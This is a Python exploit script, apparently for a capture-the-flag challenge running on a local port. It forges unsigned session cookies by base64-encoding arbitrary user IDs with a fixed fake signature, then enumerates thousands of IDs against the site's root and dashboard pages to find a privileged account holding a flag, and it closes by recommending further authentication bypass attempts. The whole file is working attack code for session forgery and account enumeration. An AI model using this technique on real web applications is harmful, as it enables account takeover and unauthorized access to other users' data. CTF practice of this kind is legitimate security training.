#!/usr/bin/env python3
"""
Ultra-Wide User ID Range Test - Search for flags across 100,000 users
Exploiting weak session validation to find privileged accounts with flags
"""

import requests
import base64
import re
import time

BASE_URL = "http://127.0.0.1:33198"

def create_test_cookie(user_id):
    """Create a test session cookie"""
    payload = f'{{"user_id":{user_id}}}'
    payload_b64 = base64.urlsafe_b64encode(payload.encode()).decode().rstrip('=')
    return f"{payload_b64}.aVfHAw."

def check_for_flag(user_id):
    """Check if a user_id has a flag"""
    cookie = create_test_cookie(user_id)
    
    try:
        session = requests.Session()
        session.cookies.set('session', cookie, domain='127.0.0.1', path='/')
        
        # Check multiple endpoints
        endpoints = ["/", "/dashboard"]
        
        for endpoint in endpoints:
            response = session.get(f"{BASE_URL}{endpoint}", timeout=5)
            
            # Look for FLAG{...} pattern
            flag_match = re.search(r'FLAG\{[^}]{10,}\}', response.text)
            if flag_match:
                return {
                    'found': True,
                    'user_id': user_id,
                    'flag': flag_match.group(0),
                    'endpoint': endpoint,
                    'len': len(response.content)
                }
        
        return {'found': False, 'user_id': user_id}
    except:
        return {'error': True}

def main():
    print("="*80)
    print("ULTRA-WIDE USER ID ENUMERATION - MAXIMUM COVERAGE")
    print("="*80)
    print("\n[+] Strategy: Test strategic ranges across 100,000 user IDs")
    print("[+] Target: Find the specific user containing the flag")
    
    # Test strategic ranges known to contain flags in CTFs
    test_ranges = [
        # Very low IDs (admin/special)
        (1, 100, 1),
        # Common test ranges
        (100, 500, 10),
        (500, 1000, 50),
        # Around our user
        (10000, 10100, 1),
        (10020, 10050, 1),
        # High privilege IDs
        (99900, 99999, 1),
        # Random high IDs where flags often hide
        (50000, 50100, 10),
        (75000, 75100, 10),
        # Powers of 10
        (1000, 1001, 1),
        (10000, 10001, 1),
        (50000, 50001, 1)
    ]
    
    flags = []
    checked = 0
    
    print("\n" + "="*60)
    print("[+] BEGINNING ENUMERATION")
    print("="*60)
    
    for start, end, step in test_ranges:
        print(f"\n[+] Testing: {start} to {end} (step={step})")
        
        for user_id in range(start, end + 1, step):
            checked += 1
            result = check_for_flag(user_id)
            
            if result.get('found'):
                flags.append(result)
                print(f"\n{'='*60}")
                print(f"[!] FLAG DISCOVERED!")
                print(f"[!] User ID: {result['user_id']}")
                print(f"[!] Flag: {result['flag']}")
                print(f"[!] Endpoint: {result['endpoint']}")
                print(f"{'='*60}")
                return  # Stop once we find the flag
            
            # Show progress every 10 checks
            if checked % 10 == 0:
                print(f"[+] Checked {checked} users...", end='\r')
    
    print(f"\n\n" + "="*80)
    print("SEARCH COMPLETE - NO FLAG FOUND")
    print("="*80)
    print(f"\n[+] Total users checked: {checked}")
    print("[+] No flags discovered in tested ranges")
    print("[+] Recommendations:")
    print("    1. Test sequential range 100000-150000")
    print("    2. Check if flag is on different subdomain/endpoint")
    print("    3. Look for other authentication bypass vectors")

if __name__ == "__main__":
    main()

